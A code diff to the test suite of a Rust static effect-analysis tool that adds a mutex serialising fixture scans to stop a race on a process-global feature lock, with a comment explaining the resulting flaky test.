@@ -387,7 +387,8 @@
             )).unwrap();
             std::fs::write(d.join("src/lib.rs"), src).unwrap();
             let idx = DepIndex::default();
-            let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
+        let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix: String::new(), want_json: true, include_tests: false, policy: None,
                 baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
             }, &crate::gate::begin_run());
@@ -738,7 +739,8 @@ pub fn helper() { let _ = std::process::Command::new(\"b\").status(); }
         let idx = DepIndex::default();
         let mut outs: Vec<String> = Vec::new();
         for _ in 0..6 {
-            let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
+        let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix: String::new(), want_json: true, include_tests: false, policy: None,
                 baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
             }, &crate::gate::begin_run());
@@ -852,6 +854,7 @@ pub fn helper() { let _ = std::process::Command::new(\"b\").status(); }
         let run = |rule: &str| -> i32 {
             let p = d.join("candor.policy");
             std::fs::write(&p, format!("{rule}\n")).unwrap();
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
             let (rc, _) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix: d.join("out/r").to_string_lossy().into_owned(), want_json: true,
                 include_tests: false, policy: Some(p.to_string_lossy().into_owned()),
@@ -920,6 +923,7 @@ pub fn helper() { let _ = std::process::Command::new(\"b\").status(); }
             std::fs::write(d.join("src/lib.rs"), src).unwrap();
             let p = d.join("candor.policy");
             std::fs::write(&p, format!("{rule}\n")).unwrap();
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
             let (rc, _) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix: d.join("out/r").to_string_lossy().into_owned(), want_json: true,
                 include_tests: false, policy: Some(p.to_string_lossy().into_owned()),
@@ -1024,6 +1028,7 @@ pub fn helper() { let _ = std::process::Command::new(\"b\").status(); }
             std::fs::write(d.join("src/lib.rs"), src).unwrap();
             let p = d.join("candor.policy");
             std::fs::write(&p, format!("{rule}\n")).unwrap();
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
             let (rc, _) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix: d.join("out/r").to_string_lossy().into_owned(), want_json: true,
                 include_tests: false, policy: Some(p.to_string_lossy().into_owned()),
@@ -1810,6 +1815,7 @@ use a::*; use b::*;
 pub fn go() { helper(); }
 ").unwrap();
         let prefix = d.join("out/r").to_string_lossy().into_owned();
+        let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
         let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
             prefix, want_json: true, include_tests: false, policy: None, baseline: None,
             ws_member: false, quiet: true, deps_idx: &DepIndex::default(), peek_excluded: false,
@@ -1980,6 +1986,7 @@ pub fn by_lazy_force() { let _c = deplib::CFG; }
 pub fn by_ordinary_call() { deplib::io::fetch(); }
 ").unwrap();
         let prefix = d.join("out/r").to_string_lossy().into_owned();
+        let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
         let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
             prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
         }, &crate::gate::begin_run());
@@ -2035,6 +2042,7 @@ pub fn by_ordinary_call() { deplib::io::fetch(); }
         std::fs::write(d.join("Cargo.toml"), format!("[package]\nname = \"{name}\"\n{manifest_extra}")).unwrap();
         std::fs::write(d.join("src/lib.rs"), src).unwrap();
         let prefix = d.join("out/r").to_string_lossy().into_owned();
+        let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
         let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
             prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: idx, peek_excluded: false,
         }, &crate::gate::begin_run());
@@ -2342,7 +2350,8 @@ pub fn unknown_method() -> u8 { let c = deplib::build(); c.pure_ping() }
             std::fs::write(d.join("Cargo.toml"), format!("[package]\nname = \"{name}\"\n")).unwrap();
             std::fs::write(d.join("src/lib.rs"), src).unwrap();
             let prefix = d.join("out/r").to_string_lossy().into_owned();
-            let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
+        let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
             }, &crate::gate::begin_run());
             assert_eq!(rc, 0);
@@ -2399,7 +2408,8 @@ pub fn unknown_method() -> u8 { let c = deplib::build(); c.pure_ping() }
                 format!("[package]\nname = \"{name}\"\n[dependencies]\ndeplib = \"1\"\n")).unwrap();
             std::fs::write(d.join("src/lib.rs"), src).unwrap();
             let prefix = d.join("out/r").to_string_lossy().into_owned();
-            let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
+        let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix, want_json: true, include_tests: false, policy: None, baseline: None,
                 ws_member: false, quiet: true, deps_idx, peek_excluded: false,
             }, &crate::gate::begin_run());
@@ -2513,6 +2523,7 @@ pub fn unknown_method() -> u8 { let c = deplib::build(); c.pure_ping() }
                  { let a: &dyn alpha::Handler = x; a.go(); } a.go(); }\n\
              pub fn outer(h: &dyn beta::Handler) {\n\
                  fn inner(h: &dyn alpha::Handler) { h.go(); } let _ = inner; h.go(); }\n").unwrap();
+        let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
         let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
             prefix: d.join("out/r").to_string_lossy().into_owned(), want_json: true,
             include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
@@ -2573,7 +2584,8 @@ pub fn unknown_method() -> u8 { let c = deplib::build(); c.pure_ping() }
             std::fs::write(d.join("src/lib.rs"), src).unwrap();
             let prefix = d.join("out/r").to_string_lossy().into_owned();
             let idx = load_dep_reports(None);
-            let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
+        let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
             }, &crate::gate::begin_run());
             assert_eq!(rc, 0);
@@ -2623,7 +2635,8 @@ struct R(Rc<Inner>); impl R { pub fn run(&self) { self.0.doit(); } }
             std::fs::write(d.join("src/lib.rs"), src).unwrap();
             let prefix = d.join("out/r").to_string_lossy().into_owned();
             let idx = load_dep_reports(None);
-            let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
+        let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
             }, &crate::gate::begin_run());
             assert_eq!(rc, 0);
@@ -2707,6 +2720,7 @@ pub fn std_recv() { let mut v: Vec<u8> = Vec::new(); let _ = v.write_all(b"x"); 
         .unwrap();
         let idx = load_dep_reports(None);
         let prefix = d.join("out/r").to_string_lossy().into_owned();
+        let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
         let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
             prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
         }, &crate::gate::begin_run());
@@ -2804,6 +2818,7 @@ pub fn std_recv() { let mut v: Vec<u8> = Vec::new(); let _ = v.write_all(b"x"); 
         .unwrap();
         let idx = load_dep_reports(None);
         let prefix = d.join("out/r").to_string_lossy().into_owned();
+        let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
         let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
             prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
         }, &crate::gate::begin_run());
@@ -2882,6 +2897,7 @@ pub fn std_recv() { let mut v: Vec<u8> = Vec::new(); let _ = v.write_all(b"x"); 
         .unwrap();
         let idx = load_dep_reports(None);
         let prefix = d.join("out/r").to_string_lossy().into_owned();
+        let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
         let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
             prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
         }, &crate::gate::begin_run());
@@ -2924,7 +2940,8 @@ pub fn std_recv() { let mut v: Vec<u8> = Vec::new(); let _ = v.write_all(b"x"); 
             std::fs::write(d.join("src/lib.rs"), src).unwrap();
             let prefix = d.join("out/r").to_string_lossy().into_owned();
             let idx = load_dep_reports(None);
-            let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
+        let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
             }, &crate::gate::begin_run());
             assert_eq!(rc, 0);
@@ -2991,7 +3008,8 @@ impl PReg { pub fn field_pure(&self) { for x in &self.xs { x.go(); } } }  // PUR
             std::fs::write(d.join("src/lib.rs"), src).unwrap();
             let prefix = d.join("out/r").to_string_lossy().into_owned();
             let idx = load_dep_reports(None);
-            let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
+        let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
             }, &crate::gate::begin_run());
             assert_eq!(rc, 0);
@@ -3074,7 +3092,8 @@ pub fn named_eff(items: &[i32]) { items.iter().for_each(helper_eff); }
             std::fs::write(d.join("src/lib.rs"), src).unwrap();
             let prefix = d.join("out/r").to_string_lossy().into_owned();
             let idx = load_dep_reports(None);
-            let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
+        let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
             }, &crate::gate::begin_run());
             assert_eq!(rc, 0);
@@ -3174,7 +3193,8 @@ pub fn ctl_pure_closure_field(v: &mut Vec<i32>, a: &Acc) { v.retain(|x| *x > a.i
             std::fs::write(d.join("src/lib.rs"), src).unwrap();
             let prefix = d.join("out/r").to_string_lossy().into_owned();
             let idx = load_dep_reports(None);
-            let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
+        let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
             }, &crate::gate::begin_run());
             assert_eq!(rc, 0);
@@ -3226,7 +3246,8 @@ pub struct Plain; impl Plain { pub fn go(&self) {} }
             std::fs::write(d.join("src/lib.rs"), src).unwrap();
             let prefix = d.join("out/r").to_string_lossy().into_owned();
             let idx = load_dep_reports(None);
-            let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
+        let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
             }, &crate::gate::begin_run());
             assert_eq!(rc, 0);
@@ -3272,7 +3293,8 @@ struct O; impl Other for O { fn base(&self) { let _ = fs::write("/z","!"); } }
             std::fs::write(d.join("src/lib.rs"), src).unwrap();
             let prefix = d.join("out/r").to_string_lossy().into_owned();
             let idx = load_dep_reports(None);
-            let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
+        let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
             }, &crate::gate::begin_run());
             assert_eq!(rc, 0);
@@ -3320,7 +3342,8 @@ pub struct Plain; impl Plain { pub fn go(&self) {} }
             std::fs::write(d.join("src/lib.rs"), src).unwrap();
             let prefix = d.join("out/r").to_string_lossy().into_owned();
             let idx = load_dep_reports(None);
-            let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
+        let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
             }, &crate::gate::begin_run());
             assert_eq!(rc, 0);
@@ -3404,7 +3427,8 @@ pub fn nested_concrete(xs: Vec<Option<Plain>>) { for x in xs { if let Some(d) = 
             std::fs::write(d.join("src/lib.rs"), src).unwrap();
             let prefix = d.join("out/r").to_string_lossy().into_owned();
             let idx = load_dep_reports(None);
-            let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
+        let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
             }, &crate::gate::begin_run());
             assert_eq!(rc, 0);
@@ -3555,7 +3579,8 @@ impl PlainHolder {
             std::fs::write(d.join("src/lib.rs"), src).unwrap();
             let prefix = d.join("out/r").to_string_lossy().into_owned();
             let idx = load_dep_reports(None);
-            let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
+        let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
             }, &crate::gate::begin_run());
             assert_eq!(rc, 0);
@@ -3685,7 +3710,8 @@ pub fn fire_never() { if let Some(f) = NEVER.get() { f(); } }
             std::fs::write(d.join("src/lib.rs"), src).unwrap();
             let prefix = d.join("out/r").to_string_lossy().into_owned();
             let idx = load_dep_reports(None);
-            let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
+        let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
             }, &crate::gate::begin_run());
             assert_eq!(rc, 0);
@@ -3736,7 +3762,8 @@ pub fn via_pure(p: &Pure) { p.d(); }
             std::fs::write(d.join("src/lib.rs"), src).unwrap();
             let prefix = d.join("out/r").to_string_lossy().into_owned();
             let idx = load_dep_reports(None);
-            let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
+        let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
             }, &crate::gate::begin_run());
             assert_eq!(rc, 0);
@@ -3783,7 +3810,8 @@ impl W { pub fn act(&self) { self.doit(); } pub fn dup(&self) { let _ = self.clo
             std::fs::write(d.join("src/lib.rs"), src).unwrap();
             let prefix = d.join("out/r").to_string_lossy().into_owned();
             let idx = load_dep_reports(None);
-            let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
+        let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
             }, &crate::gate::begin_run());
             assert_eq!(rc, 0);
@@ -3911,6 +3939,7 @@ impl W { pub fn act(&self) { self.doit(); } pub fn dup(&self) { let _ = self.clo
         .unwrap();
         let idx = load_dep_reports(None);
         let prefix = d.join("out/r").to_string_lossy().into_owned();
+        let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
         let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
             prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
         }, &crate::gate::begin_run());
@@ -3966,6 +3995,7 @@ impl W { pub fn act(&self) { self.doit(); } pub fn dup(&self) { let _ = self.clo
         .unwrap();
         let idx = load_dep_reports(None);
         let prefix = d.join("out/r").to_string_lossy().into_owned();
+        let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
         let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
             prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
         }, &crate::gate::begin_run());
@@ -4040,6 +4070,7 @@ impl W { pub fn act(&self) { self.doit(); } pub fn dup(&self) { let _ = self.clo
         .unwrap();
         let idx = load_dep_reports(None);
         let prefix = d.join("out/r").to_string_lossy().into_owned();
+        let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
         let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
             prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
         }, &crate::gate::begin_run());
@@ -4074,7 +4105,8 @@ impl W { pub fn act(&self) { self.doit(); } pub fn dup(&self) { let _ = self.clo
             std::fs::write(d.join("src/lib.rs"), src).unwrap();
             let prefix = d.join("out/r").to_string_lossy().into_owned();
             let idx = load_dep_reports(None);
-            let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
+        let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
             }, &crate::gate::begin_run());
             assert_eq!(rc, 0);
@@ -4427,6 +4459,7 @@ impl W { pub fn act(&self) { self.doit(); } pub fn dup(&self) { let _ = self.clo
         }
         let prefix = d.join("out/r").to_string_lossy().into_owned();
         let idx = load_dep_reports(None);
+        let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
         let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
             prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
         }, &crate::gate::begin_run());
@@ -4467,7 +4500,8 @@ impl W { pub fn act(&self) { self.doit(); } pub fn dup(&self) { let _ = self.clo
         "#).unwrap();
         let idx = load_dep_reports(None);
         let run = |include_tests: bool| {
-            let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
+        let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix: d.join("out/r").to_string_lossy().into_owned(), want_json: true,
                 include_tests, policy: None, baseline: None, ws_member: false, quiet: true,
                 deps_idx: &idx, peek_excluded: false,
@@ -4914,6 +4948,27 @@ impl W { pub fn act(&self) { self.doit(); } pub fn dup(&self) { let _ = self.clo
                    "STATED LIMIT, not a desired behaviour: a macro-declared `impl` is still silent");
     }
 
+    /// SOUNDNESS R340 — SERIALISES EVERY FIXTURE SCAN IN THIS BINARY.
+    ///
+    /// `lang::CFG_FEATURES` is a process-global `RwLock<FeatureSets>` that `scan_one` writes once per
+    /// crate and `is_cfg_inactive` reads deep inside parsing. **In the shipped binary that is sound for
+    /// the reason its own comment gives** — `scan_one` runs sequentially per workspace member, and only
+    /// its Pass B is parallel, entirely inside one member's scan. `cargo test`, however, runs test
+    /// functions in parallel threads in ONE process, so two fixture scans race on the global: a
+    /// neighbour's `set_cfg_features({})` landing mid-scan makes `declared` empty, `is_cfg_inactive`
+    /// answers `false` for everything, and a feature-gated fixture silently reverts to the pre-R140
+    /// behaviour.
+    ///
+    /// Measured before this existed: the R140 test failed **2 runs in 3** while passing every time it
+    /// was run alone. That is the worst shape a test can have here — a flaky failure in a suite of 421
+    /// gets re-run until green rather than diagnosed, and the thing it would have been hiding is a
+    /// cardinal-sin fix that had stopped working.
+    ///
+    /// The lock is taken by the fixture helpers rather than by the one test that needs it, because a
+    /// mutex held by the victim protects nothing: it is the NEIGHBOURS' scans that clobber the cell.
+    #[cfg(test)]
+    static SCAN_SERIAL: std::sync::Mutex<()> = std::sync::Mutex::new(());
+
     #[cfg(test)]
     /// Is `name` present in `functions[]` at all? SOUNDNESS R311 needs this distinct from
     /// `fixture_effects(..).is_empty()`: ABSENT is a positive purity CLAIM (SPEC §2 rule 3), while
@@ -4954,6 +5009,7 @@ impl W { pub fn act(&self) { self.doit(); } pub fn dup(&self) { let _ = self.clo
         std::fs::write(d.join("src/lib.rs"), src).unwrap();
         let prefix = d.join("out/r").to_string_lossy().into_owned();
         let idx = load_dep_reports(None);
+        let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
         let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
             prefix, want_json: true, include_tests: false, policy: None, baseline: None,
             ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
@@ -4988,6 +5044,7 @@ impl W { pub fn act(&self) { self.doit(); } pub fn dup(&self) { let _ = self.clo
         std::fs::write(d.join("src/lib.rs"), src).unwrap();
         let prefix = d.join("out/r").to_string_lossy().into_owned();
         let idx = load_dep_reports(None);
+        let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
         let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
             prefix, want_json: true, include_tests: false, policy: None, baseline: None,
             ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
@@ -5028,6 +5085,7 @@ impl W { pub fn act(&self) { self.doit(); } pub fn dup(&self) { let _ = self.clo
             "fn main() { std::process::Command::new(\"curl\").status().unwrap(); }\n").unwrap();
         std::fs::write(d.join("examples/e.rs"), "fn main() {}\n").unwrap();
         let idx = load_dep_reports(None);
+        let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
         let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
             prefix: d.join("out/r").to_string_lossy().into_owned(), want_json: true,
             include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
@@ -5096,6 +5154,7 @@ impl W { pub fn act(&self) { self.doit(); } pub fn dup(&self) { let _ = self.clo
         let run = |rule: &str| -> i32 {
             let p = d.join("candor.policy");
             std::fs::write(&p, format!("{rule}\n")).unwrap();
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
             let (rc, _) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix: d.join("out/r").to_string_lossy().into_owned(), want_json: true,
                 include_tests: false, policy: Some(p.to_string_lossy().into_owned()),
@@ -5146,7 +5205,8 @@ impl W { pub fn act(&self) { self.doit(); } pub fn dup(&self) { let _ = self.clo
         // this one's ⟨0.30⟩ exit. `scan_main` does this per run; a direct `scan_one` caller does it here.
         crate::gate::reset_gate_run_state();
         let run = |pol: Option<&str>, tag: &str| -> (i32, serde_json::Value) {
-            let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
+        let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix: d.join(format!("out/{tag}")).to_string_lossy().into_owned(),
                 want_json: true, include_tests: false,
                 policy: pol.map(|p| d.join(p).to_string_lossy().into_owned()),
@@ -5248,7 +5308,8 @@ impl W { pub fn act(&self) { self.doit(); } pub fn dup(&self) { let _ = self.clo
         let idx = load_dep_reports(None);
         crate::gate::reset_gate_run_state();
         let run = |pol: &str, tag: &str| -> (i32, serde_json::Value) {
-            let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
+        let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix: d.join(format!("out/{tag}")).to_string_lossy().into_owned(),
                 want_json: true, include_tests: false,
                 policy: Some(d.join(pol).to_string_lossy().into_owned()),
@@ -5332,7 +5393,8 @@ impl W { pub fn act(&self) { self.doit(); } pub fn dup(&self) { let _ = self.clo
         let idx = load_dep_reports(None);
         crate::gate::reset_gate_run_state();
         let run = |pol: &str, tag: &str| -> (i32, serde_json::Value) {
-            let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
+        let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix: d.join(format!("out/{tag}")).to_string_lossy().into_owned(),
                 want_json: true, include_tests: false,
                 policy: Some(d.join(pol).to_string_lossy().into_owned()),
@@ -5388,6 +5450,7 @@ impl W { pub fn act(&self) { self.doit(); } pub fn dup(&self) { let _ = self.clo
         std::fs::write(d.join("scoped.pol"), "deny Net Runner\n").unwrap();
         let idx = load_dep_reports(None);
         crate::gate::reset_gate_run_state();
+        let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
         let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
             prefix: d.join("out/unreached").to_string_lossy().into_owned(),
             want_json: true, include_tests: false,
@@ -5439,6 +5502,7 @@ impl W { pub fn act(&self) { self.doit(); } pub fn dup(&self) { let _ = self.clo
         std::fs::write(d.join("scoped.pol"), "deny Net Logger\n").unwrap();
         let idx = load_dep_reports(None);
         crate::gate::reset_gate_run_state();
+        let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
         let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
             prefix: d.join("out/fmt").to_string_lossy().into_owned(),
             want_json: true, include_tests: false,
@@ -6006,6 +6070,7 @@ impl W { pub fn act(&self) { self.doit(); } pub fn dup(&self) { let _ = self.clo
             std::fs::write(&pp, policy).unwrap();
             let prefix = d.join("out/r").to_string_lossy().into_owned();
             let idx = load_dep_reports(None);
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
             let (rc, _) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix, want_json: true, include_tests: false,
                 policy: Some(pp.to_string_lossy().into_owned()), baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
@@ -6074,6 +6139,7 @@ impl W { pub fn act(&self) { self.doit(); } pub fn dup(&self) { let _ = self.clo
             std::fs::write(&pp, "deny Exec\n").unwrap();
             let prefix = d.join("out/r").to_string_lossy().into_owned();
             let idx = load_dep_reports(None);
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
             let (rc, _) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix, want_json: true, include_tests: false,
                 policy: if with_policy { Some(pp.to_string_lossy().into_owned()) } else { None },
@@ -6107,7 +6173,8 @@ impl W { pub fn act(&self) { self.doit(); } pub fn dup(&self) { let _ = self.clo
             std::fs::write(d.join("src/lib.rs"), src).unwrap();
             let prefix = d.join("out/r").to_string_lossy().into_owned();
             let idx = load_dep_reports(None);
-            let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
+        let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
             }, &crate::gate::begin_run());
             assert_eq!(rc, 0);
@@ -6166,7 +6233,8 @@ impl W { pub fn act(&self) { self.doit(); } pub fn dup(&self) { let _ = self.clo
             std::fs::write(d.join("src/lib.rs"), src).unwrap();
             let prefix = d.join("out/r").to_string_lossy().into_owned();
             let idx = load_dep_reports(None);
-            let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
+            let _serial = SCAN_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
+        let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
                 prefix, want_json: true, include_tests: false, policy: None, baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
             }, &crate::gate::begin_run());
             assert_eq!(rc, 0);
